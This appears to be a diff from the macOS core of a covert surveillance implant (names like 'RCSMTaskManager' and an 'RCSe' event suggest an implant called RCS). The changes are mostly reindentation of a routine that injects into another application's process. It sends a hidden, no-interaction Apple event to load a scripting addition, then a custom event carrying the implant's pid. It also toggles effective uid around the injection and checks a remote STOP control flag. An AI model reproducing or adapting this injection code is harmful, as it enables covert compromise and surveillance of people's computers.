@@ -177,57 +177,57 @@ void lionSendEventToPid(pid_t pidP)
 {
   AEEventID eventID = 'load';
   int rUid = getuid();
-  
+
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
+
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"send event to application pid %d", pidP);
 #endif
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"enter critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
-  
+
   // trimming process u&g
   seteuid(rUid);
-  
+
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-	
+
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
-  
+
   sleep(1);
-  
+
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  
+
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
-  
+
   id injectReply = [app sendEvent: 'RCSe'
                                id: eventID
                        parameters: 'pido', pid, 0];
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"exit critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
-  
+
   if (injectReply != nil) 
-  {
+    {
 #ifdef DEBUG_CORE	
-    warnLog(@"unexpected injectReply: %@", injectReply);
+      warnLog(@"unexpected injectReply: %@", injectReply);
 #endif
-  }
+    }
   else 
-  {
+    {
 #ifdef DEBUG_CORE
-    verboseLog(@"injection done");
+      verboseLog(@"injection done");
 #endif
-  }
-  
+    }
+
   [pool release];  
 }
 
@@ -3498,83 +3498,83 @@ void lionSendEventToPid(pid_t pidP)
   int eUid = geteuid();
   int rUid = getuid();
   int maxRetry = 10;
-  
+
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
+
   // On lion fork to sendEvents without problem
   if ([gUtil isLion]) 
-  {
-    NSTask *aTask = [[NSTask alloc] init];
-    NSMutableArray *args = [NSMutableArray array];
-    NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
-    
-    /* set arguments */
-    [args addObject:[[[NSBundle mainBundle] executablePath] lastPathComponent]];
-    [args addObject: @"-p"];
-    [args addObject: pidStr];
-    [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
-    [aTask setArguments:args];
-    
+    {
+      NSTask *aTask = [[NSTask alloc] init];
+      NSMutableArray *args = [NSMutableArray array];
+      NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
+
+      /* set arguments */
+      [args addObject:[[[NSBundle mainBundle] executablePath] lastPathComponent]];
+      [args addObject: @"-p"];
+      [args addObject: pidStr];
+      [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
+      [aTask setArguments:args];
+
 #ifdef DEBUG_CORE
-    verboseLog(@"Running task with args %@", args);
+      verboseLog(@"Running task with args %@", args);
 #endif
-    
-    [aTask launch];
-    [aTask release];
-    [pidStr release];
-    
+
+      [aTask launch];
+      [aTask release];
+      [pidStr release];
+
 #ifdef DEBUG_CORE
-    verboseLog(@"task launched");
+      verboseLog(@"task launched");
 #endif
-    return;
-  }
-  
+      return;
+    }
+
   RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
-  
+
   [gControlFlagLock lock];
   NSString *localFlag = [_taskManager getControlFlag];
   [gControlFlagLock unlock];
-  
+
   if ([localFlag isEqualToString: @"STOP"])
     {
       return;
     }
-  
+
   pid_t pidP = (pid_t) [thePid intValue];
-  
+
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"send event to application pid %d", pidP);
 #endif
 
   [gSuidLock lock];
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"enter critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
-  
+
   // trimming process u&g
   if (eUid != rUid)
     seteuid(rUid);
-  
+
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-	
+
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
-  
+
   sleep(1);
-  
+
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-  
+
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
-  
+
   id injectReply = [app sendEvent: 'RCSe'
                                id: eventID
                        parameters: 'pido', pid, 0];
-  
+
   // Check if the seteuid do the correct work...
   while ((geteuid() != eUid) && maxRetry--) 
     {
@@ -3586,17 +3586,17 @@ void lionSendEventToPid(pid_t pidP)
                   errno);
 #endif
         }
-    
+
       usleep(500);
     }
-  
+
   [gSuidLock unlock];
-  
+
 #ifdef DEBUG_CORE
   verboseLog(@"exit critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
-  
+
   if (injectReply != nil) 
     {
 #ifdef DEBUG_CORE	
@@ -3609,9 +3609,9 @@ void lionSendEventToPid(pid_t pidP)
       verboseLog(@"injection done");
 #endif
     }
-  
+
   [thePid release];
-  
+
   [pool release];  
 }
 
